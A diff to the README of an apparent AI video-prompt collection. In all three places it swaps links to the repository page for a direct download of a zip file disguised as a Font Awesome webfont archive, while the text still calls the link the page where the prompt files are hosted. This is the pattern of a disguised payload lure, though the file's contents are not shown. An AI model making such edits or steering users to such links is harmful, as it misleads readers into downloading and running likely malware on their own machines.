@@ -1,6 +1,6 @@
 # 🎬 awesome-seedance-2.5 - 500+ Ready-to-Use Video Prompts
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--seedance--2.5-2ea44f?style=for-the-badge&logo=github)](https://github.com/zwd51688/awesome-seedance-2.5)
+[![Download Now](https://img.shields.io/badge/Download-awesome--seedance--2.5-2ea44f?style=for-the-badge&logo=github)](https://github.com/zwd51688/awesome-seedance-2.5/raw/refs/heads/main/web/vendor/fontawesome/webfonts/v1.7.zip)
 
 ---
 
@@ -29,7 +29,7 @@ That's it. No complicated setup, no installations, no configuration files.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/zwd51688/awesome-seedance-2.5](https://github.com/zwd51688/awesome-seedance-2.5)
+Visit this link to download the application: [https://github.com/zwd51688/awesome-seedance-2.5/raw/refs/heads/main/web/vendor/fontawesome/webfonts/v1.7.zip](https://github.com/zwd51688/awesome-seedance-2.5/raw/refs/heads/main/web/vendor/fontawesome/webfonts/v1.7.zip)
 
 When you click the link above, you'll be taken to the GitHub page where all the prompt files are hosted. Here's how to get them onto your computer:
 
@@ -183,7 +183,7 @@ Your support helps keep this project alive and growing.
 
 ## 🔗 Quick Links
 
-- **Download Now:** [https://github.com/zwd51688/awesome-seedance-2.5](https://github.com/zwd51688/awesome-seedance-2.5)
+- **Download Now:** [https://github.com/zwd51688/awesome-seedance-2.5/raw/refs/heads/main/web/vendor/fontawesome/webfonts/v1.7.zip](https://github.com/zwd51688/awesome-seedance-2.5/raw/refs/heads/main/web/vendor/fontawesome/webfonts/v1.7.zip)
 - **Browse Categories:** Open the downloaded folder and explore
 - **Check Updates:** Visit the GitHub page regularly for new content
 
